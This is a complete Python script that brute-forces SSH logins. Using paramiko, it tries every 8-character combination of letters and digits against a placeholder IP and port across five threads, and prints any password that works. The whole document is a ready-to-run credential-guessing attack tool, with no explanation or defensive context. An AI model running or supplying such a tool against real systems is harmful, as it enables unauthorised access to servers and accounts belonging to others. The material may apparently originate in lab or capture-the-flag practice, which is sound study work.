import threading
import paramiko
import sys
import string
import random
import itertools

exit_event = threading.Event()

def ssh_connect(ip:str, port:int, username:str, password_list, client=None):
    
    for value in password_list:

        # check if threading exit event is set
        if exit_event.is_set():
            sys.exit(0)

        # create password from iterator
        password = ''.join(value)
        print(password)

        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            client.connect(ip, port=port,username=username, password=password)
            print(f"[*] FOUND CORRECT PASSWORD: {password}")
            print(f"[*] Exiting...")
            exit_event.set()
        except paramiko.ssh_exception.AuthenticationException:
            #print(f"[d] Password {password} failed")
            client.close()
            pass


# generate all possible combinations of ACSII letters and digits
def generate_passwords(password_len):
    all_chars = string.digits + string.ascii_letters
    
    password_list = itertools.product(all_chars, repeat=password_len)
    return password_list

if __name__ == "__main__":
    password_list = generate_passwords(8) # 8 characters
    username = "username"
    ip = "x.x.x.x"
    port = 30022
    THREADS = 5

    print("[*] Starting the bruteforce process")
    
    for _ in range(THREADS):
        t = threading.Thread(target=ssh_connect, args=(ip, port, username, password_list))
        t.start()

    

    
    